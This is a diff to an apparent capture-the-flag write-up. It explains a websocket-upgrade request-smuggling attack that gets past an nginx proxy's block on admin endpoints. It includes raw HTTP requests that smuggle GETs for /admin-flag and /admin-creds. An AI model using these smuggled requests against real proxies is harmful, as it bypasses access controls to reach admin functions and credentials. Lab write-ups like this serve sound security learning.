@@ -603,7 +603,7 @@ Ok, now with information we have we can try to think to a possible attack vector
 5. ngix verify that the upgrade is completed (101) and permits direct communication between us (the attacker) and the backend server
 6. Doing that we can bypass the policy restriction implemented by ngix that prevent us to access the admin-* endpoints
 
-Sounds really complicated,actually it is not so complicated. First of all we have to check if we can send upgraded request to the backend through the proxy. If we send the following request:
+Sounds really complicated,actually it is not. First of all we have to check if we can send upgraded request to the backend through the proxy. If we send the following request:
 
     GET /isOnline HTTP/1.1
     Host: 10.10.227.168:8080
@@ -686,11 +686,11 @@ So we can see that ngix has validated (and upgraded) our request. Now we can try
     Cache-Control: no-cache
     Upgrade: websocket
         
-    GET //admin-flag HTTP/1.1
+    GET /admin-flag HTTP/1.1
     Host: 10.10.227.168:8080
 
     
-    GET //admin-creds HTTP/1.1
+    GET /admin-creds HTTP/1.1
     Host: 10.10.227.168:8080
 
     
